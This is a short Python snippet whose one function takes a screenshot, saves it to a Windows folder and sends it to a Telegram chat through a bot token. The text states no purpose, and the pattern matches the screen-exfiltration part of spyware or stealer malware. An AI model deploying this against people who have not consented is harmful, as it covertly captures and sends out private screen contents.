from pyscreenshot import grab
from telebot import TeleBot

def scr_shot_telegram(name, path, bot_id, server_id):
    TK = bot_id
    ID = server_id
    bot = TeleBot(TK)
    photo = grab()
    photo.save(f"{path}\\{name}")
    bin_png = open(f"{path}\\{name}", "rb")
    bot.send_photo(ID, bin_png)